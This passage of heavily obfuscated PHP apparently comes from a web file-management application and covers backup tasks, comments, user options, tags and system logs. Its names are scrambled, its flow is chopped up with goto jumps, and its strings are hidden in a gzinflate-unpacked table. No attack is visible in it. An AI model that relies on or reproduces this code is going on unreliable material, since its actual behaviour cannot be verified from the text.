$Aš¢Î›íá¸[$CàÇæ±¯‚»[197]][$CàÇæ±¯‚»[1491]] = $B¸â¨êİÏ[$CàÇæ±¯‚»[197]]; unset($B¸â¨êİÏ[$CàÇæ±¯‚»[197]]); } return array_merge($Aš¢Î›íá¸, $B¸â¨êİÏ); goto C—æË¦…ÄÙ; AŠÎ†”äÔ: $B¸â¨êİÏ = is_array($B¸â¨êİÏ) ? $B¸â¨êİÏ : array(); if (!isset($B¸â¨êİÏ[$CàÇæ±¯‚»[707]])) { $B¸â¨êİÏ[$CàÇæ±¯‚»[707]] = $CàÇæ±¯‚»[87]; } unset($B¸â¨êİÏ[$CàÇæ±¯‚»[1488]]); goto A¢Ğ½ïÁœ; CÅÏ‘˜¦Êâ: $CàÇæ±¯‚» =& $_SERVER[ÒÆ›ÆØÎ¾]; $B¸â¨êİÏ = Model($CàÇæ±¯‚»[722])->get($CàÇæ±¯‚»[734]); $B¸â¨êİÏ = json_decode($B¸â¨êİÏ, !0); goto AŠÎ†”äÔ; A¢Ğ½ïÁœ: Action($CàÇæ±¯‚»[1705])->taskInit(); Model($CàÇæ±¯‚»[1487])->cacheClear(); $Dåî†Ü•§× = $CàÇæ±¯‚»[1706]; goto f‰šê‰Ûˆ; C—æË¦…ÄÙ: } public function listData($F¡ÅÅ®‘ = false, $b÷³ëŒ¨ô½ = "\155\157\x64\151\x66\x79\124\151\x6d\145", $DáÖ§Ò¾«ˆ = false) { return parent::listData($F¡ÅÅ®‘, $b÷³ëŒ¨ô½, !0); } public function lastItem() { $cßÕç™¬À’ = $this->listData(); return !empty($cßÕç™¬À’[0]) ? $cßÕç™¬À’[0] : null; } public function kill($B‘¯¸’®£) { goto Fµñ™ÖëÄƒ; Fµñ™ÖëÄƒ: $dˆ­¾Å‹ø =& $_SERVER[ÒÆ›ÆØÎ¾]; $E¦¼„‹éã¥ = $this->listData($B‘¯¸’®£); if (!$E¦¼„‹éã¥ || empty($E¦¼„‹éã¥[$dˆ­¾Å‹ø[28]])) { return !0; } goto aÎ‡µÉ‘ĞÓ; B…‡ÀæĞ±´: return $this->remove($B‘¯¸’®£); goto e…’Ä”¢ÙÜ; aÎ‡µÉ‘ĞÓ: Task::kill($dˆ­¾Å‹ø[733]); Task::kill($dˆ­¾Å‹ø[756]); Task::kill($dˆ­¾Å‹ø[766]); goto Câ˜¡¼–”Æ; Câ˜¡¼–”Æ: $F¸ªÂ¼á•Î = $E¦¼„‹éã¥[$dˆ­¾Å‹ø[28]]; $e¸ê×ÖÏª® = TEMP_FILES . $dˆ­¾Å‹ø[730] . $F¸ªÂ¼á•Î . $dˆ­¾Å‹ø[8]; IO::remove($e¸ê×ÖÏª®, !1); goto B…‡ÀæĞ±´; e…’Ä”¢ÙÜ: } public function remove($C•ëâ¶˜Á) { $bö¡ÉÚÄæ¢ = $this->listData($C•ëâ¶˜Á); if (!$bö¡ÉÚÄæ¢) { return !0; } return $this->backupRemove($bö¡ÉÚÄæ¢); } private function backupRemove($Aˆ†Äºçó) { parent::remove($Aˆ†Äºçó[$_SERVER[ÒÆ›ÆØÎ¾][393]]); $d½¾á¹³ = $this->backupPath($Aˆ†Äºçó); IO::remove($d½¾á¹³, !1); return !0; } private function backupPath($d˜ÁŠå…š¯) { $a²Å•×Œ›¤ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b”•²ìÀ = $d˜ÁŠå…š¯[$a²Å•×Œ›¤[28]]; $a²¤«×¼ÌÈ = Model($a²Å•×Œ›¤[722])->get($a²Å•×Œ›¤[723]); $E¨ô”¤‘Ç = substr(md5($a²Å•×Œ›¤[724] . $a²¤«×¼ÌÈ . $b”•²ìÀ), 0, 8); return "\173\151\x6f\x3a{$d˜ÁŠå…š¯[$a²Å•×Œ›¤[704]]}\175\x2f\144\x61\164\141\142\x61\x73\x65\x2f\142\141\143\153\x75\x70\57" . $b”•²ìÀ . $a²Å•×Œ›¤[71] . $E¨ô”¤‘Ç; } public function start() { goto f‹‹Ö¡¹Öª; b˜ò’¿¸· : if (!$Bª§Œ¡öİë || $Bª§Œ¡öİë[$cŒøã´µ[1488]] != $cŒøã´µ[87]) { return !1; } $dÛ‘ãÏæÉ… = $this->process(); foreach ($dÛ‘ãÏæÉ… as $BëÍéäôÓÒ) { if ($BëÍéäôÓÒ) { return Task::restart($BëÍéäôÓÒ[$cŒøã´µ[393]]); } } goto a¬Ú­áà¬×; a¬Ú­áà¬×: $D‰Šå‡Ú = new Backup(); $b•²Œ©–Å‰ = $D‰Šå‡Ú->db(); if ($b•²Œ©–Å‰) { $b•²Œ©–Å‰ = $D‰Šå‡Ú->dbFile(); if ($b•²Œ©–Å‰ && $Bª§Œ¡öİë[$cŒøã´µ[707]] == $cŒøã´µ[191]) { $b•²Œ©–Å‰ = $D‰Šå‡Ú->file(); } } goto D†Ò¾Õ‹İ; f‹‹Ö¡¹Öª: $cŒøã´µ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($GLOBALS[$cŒøã´µ[6]][$cŒøã´µ[88]][$cŒøã´µ[1708]] != $cŒøã´µ[87]) { return !0; } $Bª§Œ¡öİë = $this->config(); goto b˜ò’¿¸· ; D†Ò¾Õ‹İ: Backup::set(array($cŒøã´µ[702] => 1, $cŒøã´µ[476] => time())); return !0; goto f–êçÎŒ˜; f–êçÎŒ˜: } public function process() { $aù‡¶¨Êä =& $_SERVER[ÒÆ›ÆØÎ¾]; return array($aù‡¶¨Êä[710] => Task::get($aù‡¶¨Êä[733]), $aù‡¶¨Êä[714] => Task::get($aù‡¶¨Êä[756]), $aù‡¶¨Êä[193] => Task::get($aù‡¶¨Êä[766])); } public function restore() { $c¼ÇÀ¥¾ªœ =& $_SERVER[ÒÆ›ÆØÎ¾]; ActionCall($c¼ÇÀ¥¾ªœ[1009], !0, 1); ActionCall($c¼ÇÀ¥¾ªœ[1009], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\x65\x6e\164"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\141\x6d\x65" => "\143\x6f\x6d\155\x65\x6e\x74\x5f\x6d\x65\x74\141", "\155\145\x74\141\x46\x69\145\154\144" => "\143\x6f\155\x6d\145\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($aò™ŸåÃ) { $c¸‚ƒ‰ô’‚ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($aò™ŸåÃ[$c¸‚ƒ‰ô’‚[1709]]) { $C¶ö¸á‡ø = $this->where(array($c¸‚ƒ‰ô’‚[1710] => $aò™ŸåÃ[$c¸‚ƒ‰ô’‚[1709]]))->find(); if (!$C¶ö¸á‡ø || $C¶ö¸á‡ø[$c¸‚ƒ‰ô’‚[404]] != $aò™ŸåÃ[$c¸‚ƒ‰ô’‚[404]] || $C¶ö¸á‡ø[$c¸‚ƒ‰ô’‚[484]] != $aò™ŸåÃ[$c¸‚ƒ‰ô’‚[484]]) { return !1; } $this->where(array($c¸‚ƒ‰ô’‚[1710] => $aò™ŸåÃ[$c¸‚ƒ‰ô’‚[1709]]))->setAdd($c¸‚ƒ‰ô’‚[1711], 1); } $aò™ŸåÃ[$c¸‚ƒ‰ô’‚[1712]] = 0; $aò™ŸåÃ[$c¸‚ƒ‰ô’‚[1711]] = 0; $aò™ŸåÃ[$c¸‚ƒ‰ô’‚[702]] = 1; return $this->add($aò™ŸåÃ); } public function commentCount($cùâƒ£¥µÔ, $AŸ°ò‹ôğÚ) { goto cêÓƒÍ¬ä; aÚÈÓ·‡óƒ: return array_to_keyvalue($a‚‘·Î»ó¶, $Dˆ¨’—¥Ÿ[484], $Dˆ¨’—¥Ÿ[480]); goto Fä©“”•ù‚; cêÓƒÍ¬ä: $Dˆ¨’—¥Ÿ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$cùâƒ£¥µÔ) { return array(); } if (is_string($cùâƒ£¥µÔ) || is_int($cùâƒ£¥µÔ)) { $cùâƒ£¥µÔ = array($cùâƒ£¥µÔ); } goto A­È‚é·Ç‹; A­È‚é·Ç‹: $Aé•–±œÃÊ = array($Dˆ¨’—¥Ÿ[484], $Dˆ¨’—¥Ÿ[1713] => $Dˆ¨’—¥Ÿ[480]); $fêËŞ†ë‚Œ = array($Dˆ¨’—¥Ÿ[484] => array($Dˆ¨’—¥Ÿ[7], $cùâƒ£¥µÔ), $Dˆ¨’—¥Ÿ[404] => $AŸ°ò‹ôğÚ); $a‚‘·Î»ó¶ = $this->field($Aé•–±œÃÊ)->where($fêËŞ†ë‚Œ)->group($Dˆ¨’—¥Ÿ[484])->select(); goto aÚÈÓ·‡óƒ; Fä©“”•ù‚: } public function remove($e¥èâ…ø) { $C¶ÛŸ²Ï§ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÖ½¼»Ó§™ = array($C¶ÛŸ²Ï§[1710] => $e¥èâ…ø); $DÍƒ”ïÔËí = $this->where($fÖ½¼»Ó§™)->find(); if ($DÍƒ”ïÔËí[$C¶ÛŸ²Ï§[1709]]) { $this->where(array($C¶ÛŸ²Ï§[1710] => $DÍƒ”ïÔËí[$C¶ÛŸ²Ï§[1709]]))->setAdd($C¶ÛŸ²Ï§[1711], -1); } return $this->where($fÖ½¼»Ó§™)->delete(); } public function edit($fÁß¬º›±ì, $FãòƒÎå·²) { $b‚˜Şä«æ› =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÖ”í‡¦ÓÇ = array($b‚˜Şä«æ›[1710] => $fÁß¬º›±ì); return $this->where($fÖ”í‡¦ÓÇ)->save(array($b‚˜Şä«æ›[1714] => $FãòƒÎå·²)); } public function prasise($A•óŸÔŸ) { $b“¿ïÈºÖË =& $_SERVER[ÒÆ›ÆØÎ¾]; $C÷‘Çò®æÛ = Model($b“¿ïÈºÖË[1715]); $CÂªïÙÙãĞ = array($b“¿ïÈºÖË[1710] => $A•óŸÔŸ, $b“¿ïÈºÖË[1509] => USER_ID); $AËÆä’Œì = $C÷‘Çò®æÛ->where($CÂªïÙÙãĞ)->find(); if (!$AËÆä’Œì) { $C÷‘Çò®æÛ->add($CÂªïÙÙãĞ); $A‚Î³¯Éù÷ = $this->where(array($b“¿ïÈºÖË[1710] => $A•óŸÔŸ))->setAdd($b“¿ïÈºÖË[1712], 1); } else { $C÷‘Çò®æÛ->where($CÂªïÙÙãĞ)->delete(); $A‚Î³¯Éù÷ = $this->where(array($b“¿ïÈºÖË[1710] => $A•óŸÔŸ))->setAdd($b“¿ïÈºÖË[1712], -1); } return $A‚Î³¯Éù÷; } public function targetInfo($dôÏ±õŞÓÚ, $cã‚öíØ’¬) { goto f’†Ò¬¼ë¶; b´¼ÔÖÊõ†: return $C¸âİŸ¢á©; goto A—˜‹‹­“; A’ğ­¦•ƒ: $AÍˆ›‘¾·Ó = "\x52\x49\107\110\124\40\112\x4f\x49\x4e\40{$this->tablePrefix}\x63\x6f\x6d\x6d\x65\156\164\x5f\160\x72\141\151\x73\x65\40\x73\164\141\x72\x20\157\x6e\40\143\157\155\x6d\x65\x6e\164\x2e\x63\x6f\155\x6d\145\156\x74\x49\x44\40\75\x20\163\164\x61\162\x2e\143\157\155\x6d\x65\156\x74\x49\x44"; $eÌ•®ì¿¸ = $this->alias($dªìõš–Ç[352])->where($açì©ÏĞ–½)->join($AÍˆ›‘¾·Ó, $dªìõš–Ç[1716])->count(); $C¸âİŸ¢á© = array($dªìõš–Ç[1717] => $e ½‚Š·ºÓ, $dªìõš–Ç[1718] => $eÌ•®ì¿¸); goto b´¼ÔÖÊõ†; f’†Ò¬¼ë¶: $dªìõš–Ç =& $_SERVER[ÒÆ›ÆØÎ¾]; $açì©ÏĞ–½ = array($dªìõš–Ç[549] => $dôÏ±õŞÓÚ, $dªìõš–Ç[550] => $cã‚öíØ’¬); $e ½‚Š·ºÓ = $this->where($açì©ÏĞ–½)->count(); goto A’ğ­¦•ƒ; A—˜‹‹­“: } public function listData($b¦ÍÜ¦îÕ) { $c²Òå°»ğ· =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset($b¦ÍÜ¦îÕ[$c²Òå°»ğ·[1719]])) { if ($b¦ÍÜ¦îÕ[$c²Òå°»ğ·[1719]]) { $b¦ÍÜ¦îÕ[$c²Òå°»ğ·[1720]] = array($c²Òå°»ğ·[962], intval($b¦ÍÜ¦îÕ[$c²Òå°»ğ·[1719]])); } unset($b¦ÍÜ¦îÕ[$c²Òå°»ğ·[1719]]); } if (isset($b¦ÍÜ¦îÕ[$c²Òå°»ğ·[1721]])) { if ($b¦ÍÜ¦îÕ[$c²Òå°»ğ·[1721]]) { $b¦ÍÜ¦îÕ[$c²Òå°»ğ·[1720]] = array($c²Òå°»ğ·[959], intval($b¦ÍÜ¦îÕ[$c²Òå°»ğ·[1721]])); } unset($b¦ÍÜ¦îÕ[$c²Òå°»ğ·[1721]]); } return $this->_listData($b¦ÍÜ¦îÕ); } private function _listData($FÓË±Ğ ‚‰) { $dÇ›¥¾„ì =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÀÇ³°†´‹ = $this->where($FÓË±Ğ ‚‰)->_makeOrder()->selectPage(100); $this->_listAppendParent($aÀÇ³°†´‹[$dÇ›¥¾„ì[367]]); $this->_listAppendUser($aÀÇ³°†´‹[$dÇ›¥¾„ì[367]]); $this->_listAppendMeta($aÀÇ³°†´‹[$dÇ›¥¾„ì[367]]); return $aÀÇ³°†´‹; } private function _makeOrder() { $fè¨ÜøÜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fçšÁñâˆ‹ = array($fè¨ÜøÜ[1712], $fè¨ÜøÜ[1711], $fè¨ÜøÜ[194]); $E›Õ£ï¨äØ = Input::get($fè¨ÜøÜ[435], $fè¨ÜøÜ[7], $fè¨ÜøÜ[416], $fçšÁñâˆ‹); $f½…Ÿ‡ÕÒæ = Input::get($fè¨ÜøÜ[436], $fè¨ÜøÜ[7], $fè¨ÜøÜ[1511], array($fè¨ÜøÜ[1722], $fè¨ÜøÜ[431])); $c“ğç…Îİ = $E›Õ£ï¨äØ . $fè¨ÜøÜ[50] . $f½…Ÿ‡ÕÒæ; return $this->order($c“ğç…Îİ); } private function _listAppendParent(&$C»Î—¢Ø÷Õ) { goto A™ÕøÎ Àƒ; A™ÕøÎ Àƒ: $F¿‹ÆÒ‹Åë =& $_SERVER[ÒÆ›ÆØÎ¾]; $F“¸âêİ²¸ = array_unique(array_to_keyvalue($C»Î—¢Ø÷Õ, $F¿‹ÆÒ‹Åë[33], $F¿‹ÆÒ‹Åë[1709])); $F“¸âêİ²¸ = array_remove_value($F“¸âêİ²¸, $F¿‹ÆÒ‹Åë[191]); goto bÄÜÁÖï…÷; bÄÜÁÖï…÷: if (!$F“¸âêİ²¸) { return; } $C×õ„¯Äµ‰ = $this->where(array($F¿‹ÆÒ‹Åë[1710] => array($F¿‹ÆÒ‹Åë[7], $F“¸âêİ²¸)))->select(); $C×õ„¯Äµ‰ = array_to_keyvalue($C×õ„¯Äµ‰, $F¿‹ÆÒ‹Åë[1720]); goto A‡óâ ’÷; A‡óâ ’÷: foreach ($C»Î—¢Ø÷Õ as &$E—ĞëøÉŠ‡) { if (isset($C×õ„¯Äµ‰[$E—ĞëøÉŠ‡[$F¿‹ÆÒ‹Åë[1709]]])) { $E—ĞëøÉŠ‡[$F¿‹ÆÒ‹Åë[1723]] = $C×õ„¯Äµ‰[$E—ĞëøÉŠ‡[$F¿‹ÆÒ‹Åë[1709]]]; } } unset($E—ĞëøÉŠ‡); goto F°‹ö²Â« ; F°‹ö²Â« : } private function _listAppendUser(&$dª•»³Ø†) { goto B¨ò¢‰æ¤; bÇˆ¿Êó‘µ: if (count($B±Å£ÈÎºÄ) == 0) { return; } foreach ($dª•»³Ø† as $dº¹Ø»‡µƒ) { if (isset($dº¹Ø»‡µƒ[$B¤ë¦§ÛÒµ[1723]])) { $B±Å£ÈÎºÄ[] = $dº¹Ø»‡µƒ[$B¤ë¦§ÛÒµ[1723]][$B¤ë¦§ÛÒµ[1517]]; } } $f”ôØ‡‘‘Æ = Model($B¤ë¦§ÛÒµ[506])->userListInfo($B±Å£ÈÎºÄ); goto b¬˜µ¼öù‰; b¬˜µ¼öù‰: foreach ($dª•»³Ø† as &$dº¹Ø»‡µƒ) { $dº¹Ø»‡µƒ[$B¤ë¦§ÛÒµ[562]] = $f”ôØ‡‘‘Æ[$dº¹Ø»‡µƒ[$B¤ë¦§ÛÒµ[1517]]]; if (isset($dº¹Ø»‡µƒ[$B¤ë¦§ÛÒµ[1723]])) { $dº¹Ø»‡µƒ[$B¤ë¦§ÛÒµ[1723]][$B¤ë¦§ÛÒµ[562]] = $f”ôØ‡‘‘Æ[$dº¹Ø»‡µƒ[$B¤ë¦§ÛÒµ[1723]][$B¤ë¦§ÛÒµ[1517]]]; } } unset($dº¹Ø»‡µƒ); goto aØø§˜ ä´; B¨ò¢‰æ¤: $B¤ë¦§ÛÒµ =& $_SERVER[ÒÆ›ÆØÎ¾]; $B±Å£ÈÎºÄ = array_unique(array_to_keyvalue($dª•»³Ø†, $B¤ë¦§ÛÒµ[33], $B¤ë¦§ÛÒµ[1517])); $B±Å£ÈÎºÄ = array_remove_value($B±Å£ÈÎºÄ, $B¤ë¦§ÛÒµ[191]); goto bÇˆ¿Êó‘µ; aØø§˜ ä´: } private function _listAppendMeta(&$CĞƒø¿£å¯) { goto Eœ¹‚©¤ó÷; A£‡Ü‰›ç½: if (!$AãÕ‘Š¨®œ) { return !1; } foreach ($CĞƒø¿£å¯ as &$Dçñ½±¥Ï”) { $Dçñ½±¥Ï”[$e×àµ¸ï[445]] = $AãÕ‘Š¨®œ[$Dçñ½±¥Ï”[$e×àµ¸ï[1720]]]; if (isset($Dçñ½±¥Ï”[$e×àµ¸ï[1723]])) { $Dçñ½±¥Ï”[$e×àµ¸ï[1723]][$e×àµ¸ï[445]] = $AãÕ‘Š¨®œ[$Dçñ½±¥Ï”[$e×àµ¸ï[1723]][$e×àµ¸ï[1720]]]; } } unset($Dçñ½±¥Ï”); goto A´‡±ÔÑòŸ; eñÍâ·¦œ: if (!$d½ß§”¯†¦) { return; } foreach ($CĞƒø¿£å¯ as $Dçñ½±¥Ï”) { if (isset($Dçñ½±¥Ï”[$e×àµ¸ï[1723]])) { $d½ß§”¯†¦[] = $Dçñ½±¥Ï”[$e×àµ¸ï[1723]][$e×àµ¸ï[1720]]; } } $AãÕ‘Š¨®œ = $this->metaList($d½ß§”¯†¦); goto A£‡Ü‰›ç½; Eœ¹‚©¤ó÷: $e×àµ¸ï =& $_SERVER[ÒÆ›ÆØÎ¾]; $d½ß§”¯†¦ = array_unique(array_to_keyvalue($CĞƒø¿£å¯, $e×àµ¸ï[33], $e×àµ¸ï[1720])); $d½ß§”¯†¦ = array_remove_value($d½ß§”¯†¦, $e×àµ¸ï[191]); goto eñÍâ·¦œ; A´‡±ÔÑòŸ: } private function metaList($CØ‚†–ó¾„) { goto còšÊ’Ûù«; BÆÓªÓÀë: return $dËè™ÎÚ× ? $dËè™ÎÚ× : array(); goto c³–£Ï¬ñí; E–¿¼ª…: $dËè™ÎÚ× = Model($fÖƒÁÊîª[1724])->where($AŠ»¿–—†Ú)->select(); $dËè™ÎÚ× = array_to_keyvalue_group($dËè™ÎÚ×, $fÖƒÁÊîª[1720]); foreach ($dËè™ÎÚ× as $b¥ØÕÖ²¨ => $FœàÅ§²Éê) { $e­ĞŠœ›ø = array(); foreach ($FœàÅ§²Éê as $BĞÈÓ·îÃç) { $e­ĞŠœ›ø[$BĞÈÓ·îÃç[$fÖƒÁÊîª[93]]] = $BĞÈÓ·îÃç[$fÖƒÁÊîª[372]]; } $dËè™ÎÚ×[$b¥ØÕÖ²¨] = $e­ĞŠœ›ø; } goto BÆÓªÓÀë; còšÊ’Ûù«: $fÖƒÁÊîª =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$CØ‚†–ó¾„) { return array(); } $AŠ»¿–—†Ú = array($fÖƒÁÊîª[1720] => array($fÖƒÁÊîª[7], $CØ‚†–ó¾„)); goto E–¿¼ª…; c³–£Ï¬ñí: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\145\x5f\143\157\156\x74\145\156\164\163"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\151\x6d\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\x65\162\x74", "\146\165\x6e\x63\x74\x69\157\x6e")); } goto e§ö²¢åœ·; FØ„ôÛÂ¹¦: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\137\157\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($cù‰İÉÔÈÑ) { $BåŒî“Î¾à =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!defined($BåŒî“Î¾à[454])) { define($BåŒî“Î¾à[454], 0); } return "\125\x73\145\162\x4f\x70\164\x69\157\x6e\x5f{$cù‰İÉÔÈÑ}\137" . USER_ID; } protected function filterWhere($BØ¼õ·è ˆ) { $fİ²ÇÉÈœ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!defined($fİ²ÇÉÈœ[454])) { define($fİ²ÇÉÈœ[454], 0); } $BØ¼õ·è ˆ[$fİ²ÇÉÈœ[1517]] = USER_ID; return $BØ¼õ·è ˆ; } public function cacheRemoveUser($aÊØéçÈ…, $Då˜¬§ä‡ã) { return Cache::remove("\125\163\x65\162\x4f\x70\164\x69\x6f\x6e\x5f{$aÊØéçÈ…}\x5f" . $Då˜¬§ä‡ã); } protected function optionDefault($DÊÙ‡¬ñ… = '') { $d Ù§æ«Ÿ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($DÊÙ‡¬ñ… == $d Ù§æ«Ÿ[33]) { return $GLOBALS[$d Ù§æ«Ÿ[6]][$d Ù§æ«Ÿ[2151]]; } if ($DÊÙ‡¬ñ… == $d Ù§æ«Ÿ[2152]) { return $GLOBALS[$d Ù§æ«Ÿ[6]][$d Ù§æ«Ÿ[2153]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\56\164\141\147\x4c\x69\163\x74"; public $modelType = "\125\163\x65\x72\117\x70\164\x69\x6f\x6e"; public $field = array("\156\141\155\145", "\163\164\x79\154\x65", "\163\x6f\x72\x74"); public function listData($fÒŒ¿¬¶é = false, $B‚¨‡‰ÓÓŞ = "\x73\x6f\162\x74", $CøßàëÕ¼ = false) { return parent::listData($fÒŒ¿¬¶é, $B‚¨‡‰ÓÓŞ, $CøßàëÕ¼); } public function remove($cÜà†™ì‡½) { return parent::remove($cÜà†™ì‡½); } public function add($D²Ûá”î«, $eé¡ÑÏÃä = "\154\141\142\145\x6c\x2d\x67\162\145\171\x2d\156\x6f\x72\155\x61\x6c") { $e Çª³Ñå =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->findByName($D²Ûá”î«)) { return !1; } $Bõ¦„ÁœÔ¼ = array($e Çª³Ñå[413] => $D²Ûá”î«, $e Çª³Ñå[464] => $eé¡ÑÏÃä, $e Çª³Ñå[1685] => $this->getSort($e Çª³Ñå[256]) + 1); return parent::insert($Bõ¦„ÁœÔ¼); } public function update($CÎÂÔ§ïì¤, $F°«´Î“•Ç) { $aÇ‡ïÆì¢Ô =& $_SERVER[ÒÆ›ÆØÎ¾]; $eŠÑô‚âÇ· = $this->listData($CÎÂÔ§ïì¤); $c÷×“ñí¨ = $this->findByName($F°«´Î“•Ç[$aÇ‡ïÆì¢Ô[28]]); if (!$eŠÑô‚âÇ· || $c÷×“ñí¨ && $c÷×“ñí¨[$aÇ‡ïÆì¢Ô[393]] != $eŠÑô‚âÇ·[$aÇ‡ïÆì¢Ô[393]]) { return !1; } return parent::update($CÎÂÔ§ïì¤, $F°«´Î“•Ç); } public function moveTop($AÏñ¡¸²) { $dù‚Êë­— =& $_SERVER[ÒÆ›ÆØÎ¾]; $A²”ç’×Æ = parent::listData(); $cÕä±µÖ†– = $this->getSort($dù‚Êë­—[255]); foreach ($A²”ç’×Æ as &$D„ŒõØÊìª) { if ($D„ŒõØÊìª[$dù‚Êë­—[393]] == $AÏñ¡¸²) { $D„ŒõØÊìª[$dù‚Êë­—[1704]] = $cÕä±µÖ†–; continue; } $D„ŒõØÊìª[$dù‚Êë­—[1704]] += 1; } unset($D„ŒõØÊìª); return parent::resetData($A²”ç’×Æ); } public function moveBottom($C‹ğ“‡Ş½­) { $d¶š£‹–ğÖ =& $_SERVER[ÒÆ›ÆØÎ¾]; $d„ÚÀº½¼ = $this->getSort($d¶š£‹–ğÖ[256]) + 1; return parent::update($C‹ğ“‡Ş½­, array($d¶š£‹–ğÖ[1704] => $d„ÚÀº½¼)); } public function resetSort($FØ ñ±Óæñ) { goto fÅ½Éœµ×°; Eòœ½·¬½: unset($e“¥Ü«ŠœÛ); return parent::resetData($D§×ˆ”ï­á); goto dßÖïãÁøã; fÅ½Éœµ×°: $D›Ä½Õ­¶Á =& $_SERVER[ÒÆ›ÆØÎ¾]; $då›ÄÎõ™ì = array(); $FØ ñ±Óæñ = is_array($FØ ñ±Óæñ) ? $FØ ñ±Óæñ : array(); goto Eæ—‚Ş¤™Ü; Eæ—‚Ş¤™Ü: for ($E­‡‡ó¦ = 0; $E­‡‡ó¦ < count($FØ ñ±Óæñ); $E­‡‡ó¦++) { $då›ÄÎõ™ì[$FØ ñ±Óæñ[$E­‡‡ó¦] . $D›Ä½Õ­¶Á[33]] = $E­‡‡ó¦ + 1; } $D§×ˆ”ï­á = parent::listData(); foreach ($D§×ˆ”ï­á as &$e“¥Ü«ŠœÛ) { $cŒÒÕ±ó˜ = $då›ÄÎõ™ì[$e“¥Ü«ŠœÛ[$D›Ä½Õ­¶Á[393]]]; $e“¥Ü«ŠœÛ[$D›Ä½Õ­¶Á[1704]] = $cŒÒÕ±ó˜ ? $cŒÒÕ±ó˜ : $e“¥Ü«ŠœÛ[$D›Ä½Õ­¶Á[1704]]; } goto Eòœ½·¬½; dßÖïãÁøã: } private function getSort($CÙÙ±‡¯¨ä) { $A‰¼ áÈÖ =& $_SERVER[ÒÆ›ÆØÎ¾]; $e¤²²‹òŞ = parent::listData(); $Döæâîäöù = array_to_keyvalue($e¤²²‹òŞ, $A‰¼ áÈÖ[33], $A‰¼ áÈÖ[1704]); if (!$Döæâîäöù) { $Döæâîäöù = array(0); } $CˆøÆ¯¼³¨ = $CÙÙ±‡¯¨ä == $A‰¼ áÈÖ[256] ? max($Döæâîäöù) : min($Döæâîäöù); return intval($CˆøÆ¯¼³¨); } } goto aÛ‚ËÜ·ÏÇ; bŒÑÔÆƒ‡: define($_SERVER[ÒÆ›ÆØÎ¾][0], $_SERVER[ÒÆ›ÆØÎ¾][1]); $_SERVER[©Ç§—] = explode($_SERVER[ÒÆ›ÆØÎ¾][2], gzinflate(substr($_SERVER[ÒÆ›ÆØÎ¾][3], 10, -8))); function binCheckEq($f‹î°œöæ¢, $D‘ªÄ–ô›) { return $f‹î°œöæ¢ == $D‘ªÄ–ô›; } goto BŸçöŒô; Fìöàâ†Œ: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\124\151\x6d\x65", "\164\151\155\x65", "\151\156\x73\x65\x72\x74", "\x66\x75\x6e\143\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Fê…©ˆ÷» =& $_SERVER[ÒÆ›ÆØÎ¾]; return array($Fê…©ˆ÷»[1993] => LNG($Fê…©ˆ÷»[1994]), $Fê…©ˆ÷»[1995] => LNG($Fê…©ˆ÷»[1996]), $Fê…©ˆ÷»[1621] => LNG($Fê…©ˆ÷»[1997]), $Fê…©ˆ÷»[1998] => LNG($Fê…©ˆ÷»[1999]), $Fê…©ˆ÷»[2000] => LNG($Fê…©ˆ÷»[2001]), $Fê…©ˆ÷»[2002] => LNG($Fê…©ˆ÷»[2003]), $Fê…©ˆ÷»[2004] => LNG($Fê…©ˆ÷»[2005]), $Fê…©ˆ÷»[1651] => LNG($Fê…©ˆ÷»[2005]), $Fê…©ˆ÷»[1652] => LNG($Fê…©ˆ÷»[2006]), $Fê…©ˆ÷»[2007] => LNG($Fê…©ˆ÷»[2008]), $Fê…©ˆ÷»[2009] => LNG($Fê…©ˆ÷»[2010]), $Fê…©ˆ÷»[2011] => LNG($Fê…©ˆ÷»[2012]), $Fê…©ˆ÷»[2013] => LNG($Fê…©ˆ÷»[2014]), $Fê…©ˆ÷»[1649] => LNG($Fê…©ˆ÷»[2015]), $Fê…©ˆ÷»[2016] => LNG($Fê…©ˆ÷»[2017]), $Fê…©ˆ÷»[1656] => LNG($Fê…©ˆ÷»[2018]), $Fê…©ˆ÷»[2019] => LNG($Fê…©ˆ÷»[2020]), $Fê…©ˆ÷»[2021] => LNG($Fê…©ˆ÷»[2022]), $Fê…©ˆ÷»[2023] => LNG($Fê…©ˆ÷»[2024]), $Fê…©ˆ÷»[2025] => LNG($Fê…©ˆ÷»[2026]), $Fê…©ˆ÷»[1659] => LNG($Fê…©ˆ÷»[2027]), $Fê…©ˆ÷»[1660] => LNG($Fê…©ˆ÷»[2028]), $Fê…©ˆ÷»[2029] => LNG($Fê…©ˆ÷»[2030]), $Fê…©ˆ÷»[2031] => LNG($Fê…©ˆ÷»[2032]), $Fê…©ˆ÷»[2033] => LNG($Fê…©ˆ÷»[2034]), $Fê…©ˆ÷»[1654] => LNG($Fê…©ˆ÷»[2035]), 